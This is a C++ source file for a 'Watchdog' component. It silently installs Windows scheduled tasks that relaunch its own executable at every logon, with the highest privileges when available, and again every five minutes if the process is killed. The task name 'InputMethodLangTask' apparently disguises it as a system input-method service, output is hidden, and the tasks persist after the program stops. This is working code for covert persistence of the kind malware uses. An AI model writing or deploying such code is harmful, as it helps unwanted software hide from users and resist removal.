#include "watchdog.h"
#include "utils/logger.h"

namespace agent {

Watchdog::Watchdog() = default;

Watchdog::~Watchdog() {
    // Don't delete task on normal destruct — we want it to persist
}

void Watchdog::start() {
    wchar_t exe_path[MAX_PATH];
    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

    int len = WideCharToMultiByte(CP_UTF8, 0, exe_path, -1, nullptr, 0, nullptr, nullptr);
    std::string path(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, exe_path, -1, path.data(), len, nullptr, nullptr);

    m_task_name = "InputMethodLangTask";

    if (create_scheduled_task(m_task_name, path)) {
        Logger::info("scheduled task created: " + m_task_name);
    } else {
        Logger::info("scheduled task already exists or creation skipped");
    }
}

void Watchdog::stop() {
    // Task persists — only delete on explicit uninstall
}

bool Watchdog::create_scheduled_task(const std::string& task_name, const std::string& exe_path) {
    // Use schtasks.exe — the standard Windows way to create scheduled tasks.
    // Same approach used by Chrome, OneDrive, Adobe, etc.

    // Check if task already exists
    std::string check_cmd = "schtasks /Query /TN \"" + task_name + "\" >nul 2>&1";
    if (system(check_cmd.c_str()) == 0) {
        return false; // already exists
    }

    // Create logon trigger task
    std::string create_cmd = "schtasks /Create /TN \"" + task_name + "\""
        " /TR \"\\\"" + exe_path + "\\\"\""
        " /SC ONLOGON"
        " /RL HIGHEST"
        " /F >nul 2>&1";
    int result = system(create_cmd.c_str());

    if (result != 0) {
        // Try without HIGHEST (no admin)
        create_cmd = "schtasks /Create /TN \"" + task_name + "\""
            " /TR \"\\\"" + exe_path + "\\\"\""
            " /SC ONLOGON"
            " /F >nul 2>&1";
        result = system(create_cmd.c_str());
    }

    // Also create a repeat task — every 5 minutes, ensures restart if killed
    std::string repeat_cmd = "schtasks /Create /TN \"" + task_name + "Monitor\""
        " /TR \"\\\"" + exe_path + "\\\"\""
        " /SC MINUTE /MO 5"
        " /F >nul 2>&1";
    system(repeat_cmd.c_str());

    return result == 0;
}

bool Watchdog::delete_scheduled_task(const std::string& task_name) {
    std::string cmd1 = "schtasks /Delete /TN \"" + task_name + "\" /F >nul 2>&1";
    std::string cmd2 = "schtasks /Delete /TN \"" + task_name + "Monitor\" /F >nul 2>&1";
    int r1 = system(cmd1.c_str());
    int r2 = system(cmd2.c_str());
    return r1 == 0 || r2 == 0;
}

void Watchdog::run_as_watchdog(DWORD, const std::string&) {
    // Legacy — no longer used. Task Scheduler handles restart.
}

} // namespace agent
